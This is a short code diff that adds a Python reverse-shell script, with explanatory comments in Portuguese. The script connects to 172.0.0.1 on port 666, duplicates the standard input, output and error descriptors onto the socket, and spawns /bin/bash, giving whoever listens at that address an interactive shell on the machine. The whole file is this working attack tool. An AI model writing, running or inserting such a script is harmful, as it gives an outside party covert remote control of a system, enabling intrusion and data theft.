@@ -1,0 +1,18 @@
+import socket
+import os
+import pty
+
+ip = '172.0.0.1'
+porta = 666
+
+##conexao TCP/IP
+s = socket.socket()
+s.connect((ip, porta))
+
+##tudo digitado e erros vai para a conexao
+##file descriptors codigo de entrada, saida e erros(0, 1, 2)
+for fd in (0, 1, 2):
+    ##fileno = dentro do socket retorna o fd
+    os.dup2(s.fileno(), fd)
+
+pty.spawn('/bin/bash')
